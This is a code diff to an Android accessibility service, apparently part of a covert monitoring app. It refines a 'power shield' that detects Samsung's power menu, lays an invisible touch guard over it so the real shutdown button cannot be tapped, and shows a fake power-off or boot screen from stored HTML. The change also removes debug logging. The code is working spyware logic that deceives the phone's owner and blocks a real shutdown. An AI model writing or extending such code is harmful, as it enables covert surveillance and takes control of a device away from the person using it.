@@ -254,80 +254,68 @@ class MyAccessibilityService : AccessibilityService() {
         
         // --- SCREEN RECORD GHOST LOGIC ---
         if (pkgName.contains("systemui", ignoreCase = true)) {
-            val eventTypeStr = android.view.accessibility.AccessibilityEvent.eventTypeToString(event.eventType)
-            DebugLogger.log("SYSUI_EVENT", "Event: $eventTypeStr | Class: ${event.className}")
-            
+            val isStateChange = event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+            val isContentChange = event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
+
             // --- UNIVERSAL SAMSUNG POWER SHIELD (Adaptive Universal Guard) ---
             val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
             val isShieldActive = statsPrefs.getBoolean("power_shield_active", false)
             
-            if (isShieldActive && (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)) {
-                DebugLogger.log("POWER_SHIELD", "Stage 1: Intercept triggered for event $eventTypeStr")
+            if (isShieldActive && (isStateChange || isContentChange)) {
+                val now = System.currentTimeMillis()
                 
-                // 1. STAGE 1: IMMEDIATE INTERCEPT (0ms Metadata Trigger)
-                DynamicUIManager.showTouchGuard(this)
+                // 1. STAGE 1: CPU THROTTLE (Prevent melting the CPU on every clock tick)
+                if (isContentChange) {
+                    val lastCheck = statsPrefs.getLong("power_shield_last_check", 0L)
+                    if (now - lastCheck < 300) return // Max ~3 scans per second for content changes
+                    statsPrefs.edit().putLong("power_shield_last_check", now).apply()
+                }
 
                 CoroutineScope(Dispatchers.IO).launch {
-                    var attempts = 0
                     var targetVerified = false
-                    val timeout = statsPrefs.getLong("power_shield_timeout", 15L)
+                    var attempts = 0
+                    // Loop multiple times for STATE_CHANGED to allow inflation, but only 1-shot for CONTENT_CHANGED
+                    val maxAttempts = if (isStateChange) 10 else 1
 
-                    // 2. STAGE 2: ADAPTIVE VERIFICATION LOOP (Exit on Certainty)
-                    while (attempts < 10) {
+                    // 2. STAGE 2: VERIFICATION
+                    while (attempts < maxAttempts) {
                         val root = rootInActiveWindow
-                        DebugLogger.log("POWER_SHIELD", "Loop attempt $attempts. rootInActiveWindow is ${if(root == null) "NULL" else "AVAILABLE"}")
-                        
                         if (root != null) {
                             val isPowerMenu = !root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_item_list").isNullOrEmpty()
                             val isConfirmScreen = !root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_confirmation").isNullOrEmpty()
                             
-                            DebugLogger.log("POWER_SHIELD", "Check -> isPowerMenu: $isPowerMenu | isConfirmScreen: $isConfirmScreen")
-                            
                             if (isPowerMenu || isConfirmScreen) {
                                 targetVerified = true
-                                DebugLogger.log("POWER_SHIELD", "Stage 2: Target VERIFIED at attempt $attempts!")
                                 break // Target Confirmed
                             }
                         }
-                        delay(50) // Hardware inflation buffer
+                        if (!targetVerified && isStateChange) delay(50)
                         attempts++
                     }
 
                     if (targetVerified) {
-                        DebugLogger.log("POWER_SHIELD", "Stage 3: Upgrading to FAKE UI")
-                        // 3. STAGE 3: UPGRADE TO FAKE UI
-                        val now = System.currentTimeMillis()
                         val lastTrigger = statsPrefs.getLong("power_shield_last_trigger", 0L)
                         if (now - lastTrigger > 2000) {
                             statsPrefs.edit().putLong("power_shield_last_trigger", now).apply()
+                            
+                            // 3. STAGE 3: INSTANT TOUCH SHIELD & FAKE UI
+                            // Deploy TouchGuard NOW to block the user from tapping the real button while WebView renders
+                            DynamicUIManager.showTouchGuard(this@MyAccessibilityService)
                             
                             val state = statsPrefs.getString("power_shield_state", "NORMAL") ?: "NORMAL"
                             val html = if (state == "FAKE_OFF") statsPrefs.getString("power_shield_html_boot", "") else statsPrefs.getString("power_shield_html_shutdown", "")
                             val method = statsPrefs.getString("power_shield_method", "ACC") ?: "ACC"
                             
-                            DebugLogger.log("POWER_SHIELD", "Deploying UI via $method. HTML length: ${html?.length}")
                             Handler(Looper.getMainLooper()).post {
                                 DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html ?: "", true)
                             }
                             
+                            val timeout = statsPrefs.getLong("power_shield_timeout", 15L)
                             if (timeout > 0) {
                                 delay(timeout * 1000)
-                                DebugLogger.log("POWER_SHIELD", "Timeout reached (${timeout}s). Removing UI.")
                                 DynamicUIManager.removeOverlay(this@MyAccessibilityService)
                                 DynamicUIManager.removeTouchGuard(this@MyAccessibilityService)
                             }
-                        } else {
-                            DebugLogger.log("POWER_SHIELD", "Stage 3 skipped: Cooldown active.")
-                        }
-                    } else {
-                        DebugLogger.log("POWER_SHIELD", "Stage 4: Target NOT verified after 10 attempts. False alarm. Disarming TouchGuard.")
-                        // 4. STAGE 4: PEACE OUT EARLY (False Alarm)
-                        DynamicUIManager.removeTouchGuard(this@MyAccessibilityService)
-                        
-                        val root = rootInActiveWindow
-                        if (root != null) {
-                            val treeStr = serializeNode(root, 0, 3)?.toString()?.take(500)
-                            DebugLogger.log("POWER_SHIELD_FAIL", "Tree dump snippet: $treeStr")
                         }
                     }
                 }
